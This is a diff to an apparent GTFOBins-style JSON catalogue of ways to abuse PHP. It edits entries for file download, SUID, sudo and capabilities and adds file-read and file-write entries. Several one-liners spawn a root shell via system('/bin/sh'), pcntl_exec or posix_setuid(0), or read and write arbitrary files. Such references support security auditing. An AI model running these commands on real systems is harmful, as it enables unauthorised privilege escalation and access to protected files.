@@ -37,22 +37,33 @@
     "file-download": [
       {
         "description": "Fetch a remote file via HTTP GET request.",
-        "code": "php -r 'file_put_contents(\"[file]\", file_get_contents(\"[url]\"));'\n"
+        "code": "php -r '$c=file_get_contents(\"[url]\");file_put_contents(\"[file]\", $c);'\n"
       }
     ],
     "suid": [
       {
-        "code": "CMD=\"/bin/sh\"\n./php -r \"pcntl_exec('/bin/sh', ['-p']);\"\n"
+        "code": "./php -r \"pcntl_exec('/bin/sh', ['-p']);\"\n"
       }
     ],
     "sudo": [
       {
-        "code": "CMD=\"/bin/sh\"\nsudo php -r \"system('$CMD');\"\n"
+        "code": "sudo php -r \"system('/bin/sh');\"\n"
       }
     ],
     "capabilities": [
       {
-        "code": "CMD=\"/bin/sh\"\n./php -r \"posix_setuid(0); system('$CMD');\"\n"
+        "code": "./php -r \"posix_setuid(0); system('/bin/sh');\"\n"
+      }
+    ],
+    "file-read": [
+      {
+        "code": "php -r 'readfile(\"[file]\");'\n"
+      }
+    ],
+    "file-write": [
+      {
+        "description": "write data to a file, filename should be absolute.",
+        "code": "php -r 'file_put_contents(\"[file]\", \"[data]\");'\n"
       }
     ]
   }
